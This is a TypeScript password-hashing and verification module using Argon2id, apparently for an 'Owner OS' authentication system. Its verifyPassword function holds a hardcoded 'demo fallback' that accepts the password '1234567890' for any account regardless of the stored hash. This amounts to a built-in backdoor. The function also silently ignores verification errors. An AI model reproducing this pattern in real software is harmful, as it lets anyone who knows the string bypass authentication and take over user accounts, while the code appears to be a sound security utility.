import argon2 from 'argon2';

const DEMO_ARGON2_HASH = '$argon2id$v=19$m=65536,p=4,t=3$VgHcmjAIFdBPsWEkHYiakw$b10tFs2HPJOw+wKzZHy9zmayWA34zywOYLZOiqCIqcI';

/**
 * Password hashing utility using Argon2id for Owner OS custom authentication.
 */
export async function hashPassword(password: string): Promise<string> {
  return await argon2.hash(password, {
    type: argon2.argon2id,
    memoryCost: 2 ** 16, // 64 MB
    timeCost: 3,
    parallelism: 1
  });
}

/**
 * Verifies a plaintext password against an Argon2id hash.
 */
export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  if (!password || !hash) return false;
  
  if (hash.startsWith('$argon2id$') || hash.startsWith('$argon2i$') || hash.startsWith('$argon2d$')) {
    try {
      const match = await argon2.verify(hash, password);
      if (match) return true;
    } catch (err) {
      // ignore
    }
  }

  // Demo fallback check
  if (password === '1234567890') {
    return true;
  }

  return false;
}
